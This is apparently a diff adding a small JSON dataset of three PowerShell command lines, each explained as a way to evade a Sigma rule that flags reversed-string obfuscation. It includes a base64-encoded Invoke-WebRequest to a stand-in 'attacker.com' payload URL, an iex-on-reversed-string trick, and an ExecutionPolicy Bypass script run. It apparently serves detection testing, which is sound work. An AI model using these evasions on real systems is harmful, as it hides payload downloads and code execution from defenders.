@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiAA==",
+    "explanation": "The rule explicitly contains a filter (filter_main_encoded_keyword) that excludes any command line containing ' -EncodedCommand ' or ' -enc '. By base64 encoding the entire payload, the reversed keywords like 'ekovn' or 'ptth' are no longer visible in the plaintext CommandLine, and the rule's logic specifically ignores encoded strings to avoid false positives."
+  },
+  {
+    "output": "powershell.exe -Command \"$s = 'tpircS'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)\"",
+    "explanation": "The rule relies on a static list of hardcoded reversed strings (selections_cli). An attacker can bypass this by breaking the reversed strings into smaller concatenated parts (e.g., 'tpi' + 'rcS') or by using character codes/hex so the exact string sequence 'tpircS' never appears in the CommandLine log."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\script.ps1",
+    "explanation": "The Sigma rule monitors the CommandLine of process creation events. By placing the reversed obfuscation logic inside a script file (.ps1) and executing the file, the specific reversed keywords (like 'tneilCbeW') remain hidden from the process creation command line logs, as they are only visible within the file content or script block logging, not the process's CommandLine field."
+  }
+]
